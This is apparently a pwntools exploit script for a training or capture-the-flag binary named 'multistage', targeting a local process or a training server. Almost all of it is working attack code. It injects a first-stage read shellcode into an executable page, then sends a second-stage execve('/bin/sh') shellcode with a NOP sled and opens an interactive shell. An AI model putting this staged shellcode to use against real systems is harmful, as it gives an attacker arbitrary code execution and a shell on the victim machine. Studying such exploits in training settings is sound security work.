from pwn import *

COMMANDS = """
b *0x0000000000401227
c
"""

context.arch = "amd64" 

if args.REMOTE:
    c = remote("multistage.training.offensivedefensive.it", 8080, ssl=True)
else:
    if args.GDB:
        c = gdb.debug("./multistage" , gdbscript=COMMANDS)
    else:
        c = process("./multistage")

input("Waiting for code:")

#first stage shellcode to perform a read from stdin. We are saving the content read to the same address where the memory page is 
#allocated: we are sure it's executable (info proc mappings)

c.send(b"\x50\x5E\x31\xC0\x31\xFF\x6A\x64\x5A\x0F\x05") 

input("Waiting for code2:")

#second stage shellcode: this is a classic execve syscall
c.send(b"\x90"*11+b"\x48\x31\xC0\x48\xC7\xC0\x3B\x00\x00\x00\x48\x89\xF7\x48\x83\xC7\x22\x31\xD2\x31\xF6\x0F\x05/bin/sh\0") 

c.interactive()